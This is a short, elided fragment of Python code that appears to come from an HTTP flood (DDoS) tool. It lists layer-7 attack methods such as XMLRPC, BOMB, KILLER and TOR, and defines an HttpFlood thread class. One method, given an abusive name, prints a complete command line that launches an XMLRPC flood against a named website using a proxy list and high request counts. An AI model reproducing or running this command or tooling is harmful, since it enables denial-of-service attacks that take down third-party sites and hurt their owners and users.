...
class Methods:
    LAYER7_METHODS: Set[str] = {
        ...
        "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER", "TOR", "RHEX", "STOMP", "KILL_THE_B1TCH"
    }
...
class HttpFlood(Thread):
    ...
    def KILL_THE_B1TCH():
        print('python mhccos.py XMLRPC  https://hidrosystems.org 5 1000 proxy.txt 1000 48000 true')
